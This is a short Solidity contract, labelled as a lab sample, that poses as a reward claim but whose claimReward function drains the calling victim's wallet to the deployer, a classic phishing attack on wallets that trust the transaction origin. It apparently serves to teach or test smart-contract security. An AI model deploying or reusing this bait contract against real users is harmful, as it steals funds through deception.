// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IWallet {
    function transferTo(address payable to, uint256 amount) external;
}

/// LAB ONLY: looks like a reward claim, actually drains the caller's wallet.
contract PhishingAttacker {
    IWallet public immutable wallet;
    address payable public immutable attacker;

    constructor(IWallet _wallet) {
        wallet = _wallet;
        attacker = payable(msg.sender);
    }

    /// The "bait": the victim believes this gives them a reward.
    function claimReward() external {
        wallet.transferTo(attacker, address(wallet).balance);
    }
}
